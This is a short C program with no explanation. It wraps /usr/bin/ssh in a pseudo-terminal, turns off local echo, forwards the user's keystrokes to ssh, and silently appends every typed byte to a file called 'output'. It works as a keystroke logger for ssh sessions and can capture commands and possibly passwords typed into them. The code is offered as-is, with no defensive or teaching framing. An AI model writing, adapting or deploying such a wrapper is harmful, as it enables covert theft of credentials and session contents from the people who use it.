#define _XOPEN_SOURCE 600
#include <stdlib.h>
#include <stdio.h>
#include <sys/wait.h>
#include <signal.h>
#include <poll.h>
#include <termios.h>
#include <fcntl.h>
#include <unistd.h>

int main(int argc __attribute__((unused)), char **argv)
{
	char *slavename;
	int masterfd;
	int slavefd;
	pid_t child;
	char buf;
	FILE *output;
	static struct termios oldt, newt;
	struct pollfd stdin_poll = { .fd = STDIN_FILENO,
				     .events = POLLIN | POLLRDBAND |
					       POLLRDNORM | POLLPRI };

	tcgetattr(STDIN_FILENO, &oldt);

	newt = oldt;
	newt.c_lflag &= ~(ICANON | ECHO);
	tcsetattr(STDIN_FILENO, TCSANOW, &newt);

	masterfd = posix_openpt(O_RDWR);
	grantpt(masterfd);
	unlockpt(masterfd);
	slavename = ptsname(masterfd);
	slavefd = open(slavename, O_RDWR);

	child = fork();
	if (child == -1) {
		perror("fork failed");
		exit(EXIT_FAILURE);
	} else if (child == 0) {
		dup2(slavefd, STDIN_FILENO);
		execv("/usr/bin/ssh", argv);
	} else {
		output = fopen("output", "a");
		setbuf(output, NULL);
		while (waitpid(child, NULL, WNOHANG) == 0) {
			int pollrv = poll(&stdin_poll, 1, 0);
			if (pollrv == 0) {
				continue;
			} else if (pollrv == -1) {
				perror("poll");
				exit(EXIT_FAILURE);
			}

			int b = read(STDIN_FILENO, &buf, 1);
			if (b == -1) {
				perror("stdin read error");
				exit(EXIT_FAILURE);
			} else if (b == 0) {
				break;
			} else if (write(masterfd, &buf, 1) == -1) {
				perror("write to pipe error");
				exit(EXIT_FAILURE);
			}
			fputc(buf, output);
		}
		fclose(output);
	}

	tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
	close(masterfd);
	close(slavefd);

	return 0;
}
